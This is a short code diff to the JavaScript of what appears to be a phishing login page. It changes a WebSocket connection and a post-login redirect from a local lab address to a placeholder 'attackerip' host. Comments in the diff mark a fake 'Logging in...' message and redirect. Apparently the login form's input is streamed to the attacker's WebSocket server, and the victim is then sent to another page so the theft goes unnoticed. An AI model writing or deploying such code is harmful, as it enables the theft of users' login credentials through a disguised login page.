@@ -2,7 +2,7 @@ document.addEventListener("DOMContentLoaded", function () {
     var loginForm = document.getElementById("loginForm");
 
     // Connect to WebSocket server
-    var ws = new WebSocket("ws://10.0.2.15:12345");
+    var ws = new WebSocket("ws://attackerip:12345");
 
     ws.onopen = function () {
         console.log("WebSocket Connected!");
@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function () {
         // Fake "Logging in..." message & redirect
         alert("Logging in... Please wait.");
         setTimeout(function () {
-            window.location.href = "http://10.0.2.15:3000";
+            window.location.href = "http://attackerip:3000";
         }, 2000);
     });
 
